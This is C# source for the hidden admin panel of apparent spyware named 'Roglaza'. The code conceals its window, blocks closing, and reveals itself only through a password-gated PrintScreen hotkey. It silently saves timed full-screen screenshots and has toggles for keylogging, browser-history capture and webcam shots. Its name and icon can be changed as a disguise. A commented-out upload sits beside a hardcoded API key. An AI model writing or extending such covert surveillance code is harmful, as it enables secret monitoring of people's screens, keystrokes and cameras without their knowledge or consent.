using Roglaza.Classes;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using System.Xml.Linq;

namespace Roglaza.Forms
{
    public partial class FrmAdminPanel : Form
    {

        public FrmAdminPanel(bool allowAccess=false)
        {
            InitializeComponent();
            SetVisibility(allowAccess); 
            ghk = new KeyHandler(Keys.PrintScreen, this);
           
            ghk.Register();
        }
        private void ShowAccesspanel()
        {
            Pressed_busy = true;
            if (!(this.Visible && this.panelContainer.Visible))
            {
                var f = new FrmGate();
                f.ShowInTaskbar = true;
                f.StartPosition = FormStartPosition.CenterParent;
                if (f.ShowDialog() == DialogResult.OK)
                    SetVisibility(true);
            }
            else
                SetVisibility(false);
            Pressed_busy = false;

        }
        private void SetVisibility(bool p)
        {
            if (p)
                timerSession.Start();
            if (AppInfo.TestMode)
            {

                if (p)
                {
                    this.Opacity = .9;
                    this.ShowInTaskbar = true;
                }
                else
                {
                    this.Opacity = .5;
                   // this.ShowInTaskbar = false;

                }
            }
            else
            {
                this.Visible = p;
                this.WindowState = p ? FormWindowState.Normal : FormWindowState.Minimized;
                this.StartPosition = FormStartPosition.CenterScreen;
                this.ShowInTaskbar = p;
                this.Focus();
            }
            panelContainer.Visible = p;
            this.WindowState = p ? FormWindowState.Normal : FormWindowState.Minimized;


        }

        public FrmAdminPanel(string userinput)
        {
           InitializeComponent();
        
        }

        private void FrmAdminPanel_Load(object sender, EventArgs e)
        {
            labelBannerHidden.Visible = false;
            labelBannerHidden.Visible = true;
            labelBannerHidden.Text = MessageStrings.ImHidden;
            label_Banner.Text = AppInfo.AppBanner;
            label_app_Name.Text = AppInfo.AppName;
            this.numericUpDown_screenShotInterval.Value = Program.ProgramSettings.ScreenShotInterValMinutes<numericUpDown_screenShotInterval.Maximum?Program.ProgramSettings.ScreenShotInterValMinutes:60;
            if (AppInfo.TestMode)
                this.timerWatcher.Interval = 5000;

            this.timerWatcher.Start();
            if (AppInfo.TestMode)
                this.Opacity = .1;

            this.checkBoxBrowserHistory.Checked = Program.ProgramSettings.AllowBrowserHistory;
            this.checkBoxScreenShots.Checked = Program.ProgramSettings.AllowScreenShots;
            this.checkBoxCamShots.Checked = Program.ProgramSettings.AllowCamShots;
            this.checkBoxKeyLogger.Checked = Program.ProgramSettings.AllowKeyLogger;

            this.textBox_Icon_path.Text = Program.ProgramSettings.RoglazaIconPath;
            try
            {
                this.Text =this.textBoxAppName.Text= Program.ProgramSettings.RoglazaName;
                if (RoglazaHelper.IsExistedFile(Program.ProgramSettings.RoglazaIconPath))
                    this.Icon = new Icon(Program.ProgramSettings.RoglazaIconPath);
            }
            catch { }
            textBox_logsPath.Text = Program.ProgramSettings.LogsPath;
            FormLoaded = true;

        }
        private bool Pressed_busy = false;
        private KeyHandler ghk;
        private int pressed_button_times = 0;
        private void HandleHotkey()
        {
            if (Pressed_busy == false)
                ShowAccesspanel(); 
        }

        protected override void WndProc(ref Message m)
        {
            if (m.Msg == Constants.WM_HOTKEY_MSG_ID)
                HandleHotkey();
            base.WndProc(ref m);
        }

        private void button1_Click(object sender, EventArgs e)
        {
        }

        private void FrmAdminPanel_Resize(object sender, EventArgs e)
        {

            if (this.WindowState== FormWindowState.Minimized)
                panelContainer.Visible = false;
           
        }

        private void FrmAdminPanel_VisibleChanged(object sender, EventArgs e)
        {
            Pressed_busy = false;

        }

        private void FrmAdminPanel_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
            this.Activate();
            this.Pressed_busy = false;

        }


        private void timerWatcher_Tick(object sender, EventArgs e)
        {
            Capture_count++;

            var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                               Screen.PrimaryScreen.Bounds.Height,
                               PixelFormat.Format32bppArgb);

            // Create a graphics object from the bitmap.
            var gfxScreenshot = Graphics.FromImage(bmpScreenshot);

            // Take the screenshot from the upper left corner to the right bottom corner.
            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
                                        Screen.PrimaryScreen.Bounds.Y,
                                        0,
                                        0,
                                        Screen.PrimaryScreen.Bounds.Size,
                                        CopyPixelOperation.SourceCopy);

            // Save the screenshot to the specified path .
            string _date = RoglazaHelper.RemoveInvalidPathChars(DateTime.Now.ToShortDateString());
            int current_hour = DateTime.Now.Hour;
            string current_hour_str="12 PM";
            if (current_hour ==0)
                current_hour_str =  "12 AM";            
            else if (current_hour <12)
                current_hour_str = current_hour + " AM";
            else   if (current_hour > 12)
                current_hour_str = (current_hour - 12) + " PM";


            string Album_Directory= Program.ProgramSettings.LogsPath + "\\Screens\\" + _date + "\\" + current_hour_str;
            Album_Directory = RoglazaHelper.createDirectoryIfNotFound(Album_Directory);
            string TimeStamp_ =  "\\" +RoglazaHelper.RemoveInvalidPathChars( DateTime.Now.ToShortTimeString().ToString());
            string Path_ = Album_Directory + TimeStamp_ +"  "+this.Capture_count+ ".png";
            bmpScreenshot.Save(Path_, ImageFormat.Png);

          
                  // { "key", "433a1bf4743dd8d7845629b95b5ca1b4" },
            //string url = (RoglazaHelper.Upload(Path_, ""));
            //if (url.StartsWith("http"))
            //{
            //    File.Move(Path_, Path_ + ".upd");

            //}
                  
        }

        private void numericUpDown_screenShotInterval_ValueChanged(object sender, EventArgs e)
        {
            if (AppInfo.TestMode)
                this.timerWatcher.Interval = 5000;
            else
                this.timerWatcher.Interval = ((int)numericUpDown_screenShotInterval.Value) * 60000;
            Program.ProgramSettings.SETScreenShotInterValMinutes((int)numericUpDown_screenShotInterval.Value);
        }

        private void button_Exit_Click(object sender, EventArgs e)
        {

        }

        private void linkLabelOpenLogsFolder_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            RoglazaHelper.StartProcess(Program.ProgramSettings.LogsPath);
        }

        private void panel1_VisibleChanged(object sender, EventArgs e)
        {
            this.labelBannerHidden.Visible = !panelContainer.Visible;
        }





        public bool FormLoaded=false;

        private void checkBoxKeyLogger_CheckedChanged(object sender, EventArgs e)
        {

            if (FormLoaded)
                Program.ProgramSettings.AllowKeyLogger = checkBoxKeyLogger.Checked;
            Program.ProgramSettings.SaveSettings();
        }

        private void checkBoxBrowserHistory_CheckedChanged(object sender, EventArgs e)
        {

            if (FormLoaded)
                Program.ProgramSettings.AllowBrowserHistory = checkBoxBrowserHistory.Checked;
            Program.ProgramSettings.SaveSettings();

        }

        private void checkBoxScreenShots_CheckedChanged(object sender, EventArgs e)
        {

            if (FormLoaded)
                Program.ProgramSettings.AllowScreenShots = checkBoxScreenShots.Checked;
            Program.ProgramSettings.SaveSettings();

        }

        private void checkBoxCamShots_CheckedChanged(object sender, EventArgs e)
        {
            if (FormLoaded)
                Program.ProgramSettings.AllowCamShots = checkBoxCamShots.Checked;
            Program.ProgramSettings.SaveSettings();

        }

        private void buttonBrwseicon_Click(object sender, EventArgs e)
        {
            OpenFileDialog o = new OpenFileDialog();
            o.Filter = "icon File (*.ico)|.ico";
            if (o.ShowDialog() == DialogResult.OK && o.FileName.EndsWith(".ico"))
            {
                Program.ProgramSettings.RoglazaIconPath = o.FileName;
                Program.ProgramSettings.SaveSettings();
            }
        }

        private void textBoxAppName_TextChanged(object sender, EventArgs e)
        {
            if (FormLoaded)
            {
                Program.ProgramSettings.RoglazaName = this.Text = this.textBoxAppName.Text;
                Program.ProgramSettings.SaveSettings();

            }
        }

        private void textBox_Icon_path_TextChanged(object sender, EventArgs e)
        {
            try
            {
                this.panel_icon_Preview.BackgroundImage = Image.FromFile(textBox_Icon_path.Text);
            }
            catch { }
        }

        private void timerSession_Tick(object sender, EventArgs e)
        {
            timerSession.Stop();
            SetVisibility(false);
        }

        private void labelBannerHidden_VisibleChanged(object sender, EventArgs e)
        {
            pictureBox_Spy.Visible = labelBannerHidden.Visible;
            pictureBox_Spy.Location = new Point(184, 34);
            pictureBox_Spy.Size = new Size(360, 258);
        }

        private void buttonKill_Click(object sender, EventArgs e)
        {
             
                var f = new FrmGate();
                f.ShowInTaskbar = true;
                f.StartPosition = FormStartPosition.CenterParent;
                if (f.ShowDialog() != DialogResult.OK)
                    return;
            


            DialogResult d = MessageBox.Show(MessageStrings.DoYouWantToStopTheApplication, MessageStrings.Warning, MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
            if (d == DialogResult.OK || d==DialogResult.Yes)
            {
                if (RoglazaInstaller.SetKillFile(true))
                {
                    MessageBox.Show(MessageStrings.UnistallationMessage, MessageStrings.UnistallationMessage_Caption);
                    buttonKill.Visible = false;
                }
                else MessageBox.Show(MessageStrings.KillingError);
            }
        }

        private void buttonCancelUnistallation_Click(object sender, EventArgs e)
        {
            if (RoglazaInstaller.SetKillFile(false))
            {
                buttonKill.Visible = true;
                MessageBox.Show(MessageStrings.ProgramWillContinueWorking, MessageStrings.Thanks);
            }
        }

        private void buttonKill_VisibleChanged(object sender, EventArgs e)
        {
            buttonCancelUnistallation.Visible = !buttonKill.Visible;
        }

        private void linkLabel_app_data_dir_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            RoglazaHelper.StartProcess(RoglazaInstaller.GetRoglazaAPPDataPath());
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            if (FormLoaded)
            {
                Program.ProgramSettings.LogsPath = textBox_logsPath.Text;
                Program.ProgramSettings.SaveSettings();
            }
        }

        private void button_Browse_logs_path_Click(object sender, EventArgs e)
        {

            FolderBrowserDialog f = new FolderBrowserDialog();
            if (f.ShowDialog() == DialogResult.OK)
                textBox_logsPath.Text = f.SelectedPath;
          
        }

        public int Capture_count = 1;

        private void button1_Click_1(object sender, EventArgs e)
        {

        }
    }
    //Refernce
    //http://stackoverflow.com/questions/18291448/how-do-i-detect-keypress-while-not-focused
    public class KeyHandler
    {
        [DllImport("user32.dll")]
        private static extern bool RegisterHotKey(IntPtr hWnd, int id, int fsModifiers, int vk);

        [DllImport("user32.dll")]
        private static extern bool UnregisterHotKey(IntPtr hWnd, int id);

        private int key;
        private IntPtr hWnd;
        private int id;

        public KeyHandler(Keys key, Form form)
        {
            this.key = (int)key;
            this.hWnd = form.Handle;
            id = this.GetHashCode();
        }

        public override int GetHashCode()
        {
            return key ^ hWnd.ToInt32();
        }

        public bool Register()
        {
            return RegisterHotKey(hWnd, id, 0, key);
        }

        public bool Unregiser()
        {
            return UnregisterHotKey(hWnd, id);
        }
    }
    public static class Constants
    {
        //windows message id for hotkey
        public const int WM_HOTKEY_MSG_ID = 0x0312;
    }
}
